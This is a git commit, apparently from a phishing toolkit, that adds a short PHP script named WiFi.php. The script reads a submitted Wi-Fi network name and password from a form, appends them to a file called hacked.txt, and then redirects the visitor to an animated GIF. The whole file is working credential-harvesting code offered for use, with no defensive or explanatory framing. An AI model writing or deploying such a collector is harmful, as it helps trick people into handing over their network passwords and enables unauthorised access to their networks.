ec3f233df6cdcb93adaf46b8aa1167021ba553a5
*ERR0R* <59941931+Err0r-ICA@users.noreply.github.com>
2020-04-30 04:23:14 +0200

    Add files via upload

---
+++ WiFi.php
@@ -0,0 +1,5 @@
+<?php
+
+file_put_contents("hacked.txt", "[Wifi-name:] " . $uname = $_POST['uname'] . " [pin/pass:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
+header('Location: https://thumbs.gfycat.com/BriefDescriptiveIcterinewarbler-size_restricted.gif');
+?>
